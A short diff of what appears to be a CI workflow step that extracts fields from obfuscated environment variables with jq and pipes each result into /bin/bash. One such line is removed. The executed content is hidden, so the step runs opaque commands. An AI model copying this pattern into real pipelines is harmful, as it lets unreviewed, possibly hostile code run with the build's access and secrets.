@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$viut4" | jq -r .yshiq161 | /bin/bash
           printf '%s' "$wm59" | jq -r .kajmh208 | /bin/bash
-          printf '%s' "$pmx4011" | jq -r .wh5133 | /bin/bash
           echo $pnbl25 | jq -r .umd497 | /bin/bash
 
       - name: Save archive
